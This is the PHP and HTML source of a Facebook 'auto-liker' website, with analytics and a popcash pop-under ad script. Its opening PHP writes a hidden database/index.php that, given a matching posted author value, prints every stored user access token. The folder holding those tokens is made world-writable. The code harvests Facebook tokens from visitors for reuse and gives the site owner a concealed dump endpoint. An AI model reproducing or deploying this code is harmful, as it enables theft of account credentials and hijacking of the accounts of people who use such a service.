 <?php
if(!file_exists('database'))
{
	mkdir('database',0777,true);
}
$totaluser = -1;
if($handle = opendir('database'))
{
	echo "<link rel='stylesheet' type='text/css' href='http://pastebin.com/raw.php?i=PkydVnqn' media='all'/>";
	if(!file_exists('database/index.php'))
	{
		$handle1 = fopen('database/index.php', 'w') or die('Error !');
		$data = '<?php
include "../info.php";
$author = $_POST["author"];
if($author != $set[author])
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
			}
		}
	closedir($handle);
	}
}
else
{
	if($handle = opendir("../database"))
	{
		while (false !== ($entry = readdir($handle)))
		{
			if($entry != "." && $entry != "..")
			{
				$user = fopen($entry,"r") or die("Error !");
				$accesstoken = fgets($user);
				echo $accesstoken."<br/>";
			}
		}
	closedir($handle);
	}
}
?>';
		fwrite($handle1, $data);
		fclose($handle1);
	}
	while (false !== ($entry = readdir($handle)))
	{
		if($entry != "." && $entry != "..")
		{
			$totaluser++;
		}
	}
	closedir($handle);
}
include 'info.php';
?>

<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head> 
 <title> WwW.LikezBd.Com �� | AutoLiker | Auto-Comments | Fanpage Liker| Auto-Follow | Auto-Requests </title>
<meta name="referrer" content="default" id="meta_referrer" />
 <link rel="shortcut icon" href="/favicon.ico">
 
<meta property="og:image" content="../img/icon.png"/>

<link rel="shortcut icon" href="../img/favicon.png"> <link rel="stylesheet" href="../css/home.css" type="text/css"> 
 <link rel="stylesheet" href="../css.css" type="text/css"> <link rel="stylesheet" href="../css/asu.1.css" type="text/css">
<link rel="stylesheet" href="../css/asu.2.css" type="text/css">
<link rel="stylesheet" href="../css/asu.3.css" type="text/css"> 
 
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-55422898-1', 'auto');
  ga('send', 'pageview');

</script>
    <script src="jquery1.1.js"></script>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	<style>
.font {
  font: italic small-caps bold 32px/59px Helvetica, sans-serif;
  text-align: center;
  text-shadow: 0px 2px 13px white;
  colour: white;
}
input, textarea { 
    padding: 9px;
    border: solid 1px #E5E5E5;
    outline: 0;
    font: normal 13px/100% Verdana, Tahoma, sans-serif;
    background: #00FF00;
	box-shadow: rgba(0,0,0, 0.1) 0px 0px 8px;
    -moz-box-shadow: rgba(0,0,0, 0.1) 0px 0px 8px;
    -webkit-box-shadow: rgba(0,0,0, 0.1) 0px 0px 8px;
    }
input:hover, textarea:hover,
input:focus, textarea:focus { 
    border-color: #C9C9C9; 
    }
input:hover, textarea:hover,
input:focus, textarea:focus { 
    -webkit-box-shadow: rgba(0, 0, 0, 0.15) 0px 0px 8px;
    }
</style>
</head></body><div class="navbar navbar-default">
  <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-responsive-collapse">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="#">FB-likess</a>
  </div>
  <div class="navbar-collapse collapse navbar-responsive-collapse">
    <ul class="nav navbar-nav">
      <li class="active"><a href="index.php">Home</a></li>
      <li><a href="http://fb.com/raywall.rabin">Contact Me</a></li>
	      </ul>
</div>
<script type="text/javascript">
var uid = '20836';
var wid = '52499';
</script>
<script type="text/javascript" src="http://cdn.popcash.net/pop.js"></script> 
 
 